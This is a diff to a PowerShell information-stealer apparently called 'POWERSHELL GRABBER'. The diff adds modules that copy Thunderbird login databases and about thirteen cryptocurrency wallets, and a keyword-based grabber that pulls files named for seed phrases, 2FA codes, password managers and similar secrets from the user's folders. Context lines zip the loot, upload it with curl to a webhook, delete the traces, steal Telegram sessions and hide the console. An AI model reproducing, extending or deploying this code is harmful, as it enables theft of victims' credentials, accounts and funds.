@@ -1,4 +1,4 @@
-function CHECK_IF_ADMIN {
+﻿function CHECK_IF_ADMIN {
     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
 }
 
@@ -87,8 +87,7 @@ function EXFILTRATE-DATA {
     $files = Get-ChildItem -Path $path -Exclude $exclude
     Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest
     }
-    telegramstealer
-   
+    telegramstealer 
     
 	# Desktop screenshot
 	
@@ -112,7 +111,7 @@ function EXFILTRATE-DATA {
         if ($disk.Size -gt 0) {
             $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
             $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
-            $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
+    		$usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
             [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
 			[int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
             [PSCustomObject]@{
@@ -150,6 +149,118 @@ function EXFILTRATE-DATA {
     }
     $ProductKey = Get-ProductKey
     Get-ProductKey > $env:localappdata\temp\ProductKey.txt
+	
+	New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
+	$crypto = "$env:localappdata\Temp\Crypto Wallets"
+
+    # Thunderbird Exfil
+	
+    $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
+    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
+    New-Item -Path "$crypto\Thunder" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$crypto\Thunder" -Recurse -Force
+    }
+    # Crypto Wallets
+    
+    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
+    New-Item -Path "$crypto\Armory" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$crypto\Armory" -Recurse -Force
+    }
+    
+    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
+    New-Item -Path "$crypto\Atomic" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$crypto\Atomic" -Recurse -Force
+    }
+    
+    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
+    New-Item -Path "$crypto\BitcoinCore" -ItemType Directory | Out-Null
+    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\BitcoinCore" -Recurse -Force
+    }
+    If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
+    New-Item -Path "$crypto\bytecoin" -ItemType Directory | Out-Null
+    Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$crypto\bytecoin" -Recurse -Force
+    }
+    If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
+    New-Item -Path "$crypto\Coinomi" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$crypto\Coinomi" -Recurse -Force
+    }
+    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
+    New-Item -Path "$crypto\DashCore" -ItemType Directory | Out-Null
+    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\DashCore" -Recurse -Force
+    }
+    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
+    New-Item -Path "$crypto\Electrum" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$crypto\Electrum" -Recurse -Force
+    }
+    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
+    New-Item -Path "$crypto\Ethereum" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$crypto\Ethereum" -Recurse -Force
+    }
+    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
+    New-Item -Path "$crypto\exodus.wallet" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$crypto\exodus.wallet" -Recurse -Force
+    }
+    If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
+    New-Item -Path "$crypto\liberty.jaxx" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$crypto\liberty.jaxx" -Recurse -Force
+    }
+    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
+    New-Item -Path "$crypto\Litecoin" -ItemType Directory | Out-Null
+    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\Litecoin" -Recurse -Force
+    }
+    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
+    New-Item -Path "$crypto\Monero" -ItemType Directory | Out-Null
+    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$crypto\Monero" -Recurse  -Force
+    }
+    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
+    New-Item -Path "$crypto\Zcash" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$crypto\Zcash" -Recurse -Force
+    }
+
+    #Files Grabber
+    
+	New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
+	$filegrabber = "$env:localappdata\Temp\Files Grabber"
+	Function GrabFiles {
+    $grabber = @(
+    "account",
+    "login",
+    "metamask",
+    "crypto",
+    "code",
+    "coinbase",
+    "exodus",
+    "backupcode",
+    "token",
+    "seedphrase",
+    "private",
+    "pw",
+    "lastpass",
+    "keepassx",
+    "keepass",
+    "keepassxc",
+    "nordpass",
+    "syncthing",
+    "dashlane",
+    "bitwarden",
+    "memo",
+    "keys",
+    "secret",
+    "recovery",
+    "2fa",
+    "pass",
+    "login",
+    "backup",
+    "discord",
+    "paypal",
+    "wallet"
+    )
+    $dest = "$env:localappdata\Temp\Files Grabber"
+    $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
+    [regex] $grab_regex = ‘(‘ + (($grabber |foreach {[regex]::escape($_)}) –join "|") + ")"
+    (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
+    }
+    GrabFiles
     
     
     $embed_and_body = @{
@@ -252,10 +363,14 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue
 	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" -ErrorAction SilentlyContinue
+	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" -ErrorAction SilentlyContinue
+	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" -ErrorAction SilentlyContinue
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
     Remove-Item "$extracted\KDOT.zip"
     Remove-Item "$extracted\KDOT" -Recurse
+	Remove-Item "$filegrabber\Files Grabber" -recurse -force
+	Remove-Item "$crypto\Crypto Wallets" -recurse -force
     Remove-Item "$extracted\main.exe"
 }
 
@@ -284,6 +399,8 @@ function Request-Admin {
         catch {}
     }
 }
+
+
 
 function Hide-Console
 {
